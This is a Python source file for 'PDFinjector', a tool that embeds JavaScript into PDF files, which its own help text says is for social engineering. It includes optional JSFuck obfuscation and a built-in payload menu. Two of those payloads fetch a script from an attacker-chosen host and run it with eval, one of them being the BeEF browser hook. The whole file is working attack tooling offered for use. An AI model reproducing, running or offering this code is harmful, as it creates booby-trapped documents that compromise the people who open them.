#https://pypdf.readthedocs.io/en/stable/user/add-javascript.html

from pypdf import PdfWriter, PdfReader
import argparse, execjs, time


parser = argparse.ArgumentParser(description="PDFinjector can insert javascript code in pdf files, perfect for social engineering.")

parser.add_argument("-f", "--file", type=str, help="the input file", required=True)
parser.add_argument("-o", "--output", type=str, help="the output file, if not set it will overwrite the input file")
parser.add_argument("-cp", "--custompayload", type=str, help="the custom payload to inject, via text")
parser.add_argument("-cfp", "--customfilepayload", type=str, help="the custompayload to inject, via file.js")
parser.add_argument("-ob", "--obfuscate", action="store_true", help="obfuscate the code using jsfuck")

args = parser.parse_args()

banner = r"""     __     _____ ____  _____
|--_ /_-| |    ||    \|  __| _  __ _  _    ___  ___  ___  ___  ___
|  / /  | | |__|| |  ||  __|| || \  || |_ | __|/ __||_ _||   || |_|
|--/----| |__|  |____/|__|  |_||_|\_|| / /|_--|\___| |_| |___||_\_\ V1.0"""
payloads = [
    
    "console.println('JavaScript is running');", "classic log",

    """fetch('https://ARGUMENT/ARGUMENT.js')
    .then(response => response.text())
    .then(script => eval(script))
    .catch(error => console.error('Error loading script:', error));""", "a code in a remote server",
    
    """fetch('https://ARGUMENT/hook.js')
    .then(response => response.text())
    .then(script => eval(script))
    .catch(error => console.error('Error loading script:', error));""", "the BeEF hook"
]

def inject(pdft, payload, output):
    print("INJECT...")
    pdft = PdfReader(pdft)
    pdf = PdfWriter(clone_from=pdft)
    pdf.add_js(payload)        
    with open(output, "wb") as pdftrg:
        pdf.write(pdftrg)

def obf(payload):
    f = open("lib/jsfuck.js", 'r')
    f = f.read()
    js = execjs.get()
    cjs = js.compile(f)
    return cjs.call('JSFuck',payload,'1')

def main():
    print(banner)
    payload = ""

    if args.output:
        output = args.output
    else: 
        output = args.file
        
    if args.custompayload:
        payload = args.custompayload
    elif args.customfilepayload:
        payload = args.customfilepayload
    else:
        print("-"*40)
        for index in range(0, len(payloads), 2):
            print(f"{index//2 + 1}) \nCODE:")
            print(payloads[index])
            print("DESCRIPTION:")
            print(payloads[index + 1])
            print("-" * 40)
        payload = int(input("select the number of the payload: "))-1
        if 0 <= payload < len(payloads) // 2:
            payload = payloads[payload * 2]
        else:
            print("invalid input")
    

    if args.obfuscate:
        try:
            payload = obf(payload)
        except Exception as e:
            print(f'error during obfuscation: {e}')

    if args.file:
        print("USING:", payload)
        try:
            inject(args.file, payload, output)
        except Exception as e:
            print(f'error during injection: {e}')
        else:
            print(f"INJECTION SUCCESFULL IN: {output}")
main()
